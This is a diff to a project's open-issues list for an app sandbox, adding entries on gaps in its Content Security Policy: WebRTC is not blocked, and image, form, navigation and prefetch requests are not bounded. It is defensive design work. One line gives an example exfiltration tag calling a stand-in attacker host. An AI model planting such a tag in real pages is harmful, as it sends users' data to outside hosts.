@@ -864,6 +864,51 @@ advisory rather than a build gate. Hold `check:comments` until Open point 2 is r
 
 **Needed by:** whenever the next batch of commits is written by an agent. Not blocking.
 
+### A41 — WebRTC blocking has no mechanism specified anywhere **[RESEARCH]**
+
+Found 2026-09-02 writing T22's CSP `connect-src` derivation
+(`src/broker/policy/connect-src.ts`). ADR-0006 requires that an app without a network capability
+be unable to reach the network at all, and WebRTC is a hole in that: a plain `RTCPeerConnection`
+can open a data channel or hit a STUN/TURN server without ever calling `orivon.net.connect`, and
+without going through `fetch`/`WebSocket` either — so nothing this build step touches bounds it.
+
+No mechanism is specified anywhere in the corpus. There is no `webrtc-src` in real CSP (the
+directive does not exist); nothing in this tree or the vision corpus references
+`setPermissionRequestHandler` or a Blink feature-disabling precedent for it.
+
+**This is not purely a missing-mechanism problem.** The flagship's own spike evidence
+(`week-0-spike-plan.md`) deliberately leaves WebRTC unaliased so webtorrent uses Chromium's
+native implementation — blocking WebRTC outright for a capability-less app would also break the
+flagship's own use of it, unless blocking is scoped to "no network capability granted" in a way
+nothing here yet defines. "Block WebRTC" has an unrecorded product cost, not just an unbuilt
+mechanism.
+
+**Needed by:** build step 6, before the trust indicator's C-ladder claims are shown to a user —
+a claim of "no network access" is false today for any app that tries WebRTC. Not blocking this
+PR.
+
+### A42 — what the injected CSP does not bound **[STILL OPEN]**
+
+Found 2026-09-02, same file as A41. Stated in `connect-src.ts`'s own header, recorded here so it
+is reachable outside a code comment (A40's own lesson).
+
+T22's `connect-src` bounds `fetch` and WebSocket only. `img-src`, `form-action`, navigation
+(`<a href>`, `location.href`), and `<link rel=prefetch>` are separate CSP directives this PR does
+not set, and an app can use any of them to exfiltrate data to a host `orivon.net.connect` would
+have refused — an `<img src="http://attacker.example/?d=...">` needs no capability at all under
+today's policy. ADR-0006's "the manifest genuinely bounds network reach" overstates this for
+anything beyond `fetch`/WebSocket.
+
+Separately, and more fundamentally: CSP bounds **names**, `checkConnect` bounds **resolved
+addresses**. For a hostname pattern the two diverge exactly on DNS rebinding (T12) — a name CSP
+grants reach to can still resolve privately, reachable by `fetch` though not by
+`orivon.net.connect`. No CSP construction closes that; it is Chromium's Private Network Access
+problem, not this function's.
+
+**Needed by:** before the trust indicator (build step 6) or `security-model.md` state either gap
+as closed. Not blocking this PR — recorded so the honest scope of T22 survives past the file
+header that currently carries it alone.
+
 ---
 
 ## B. Contradictions still to fix
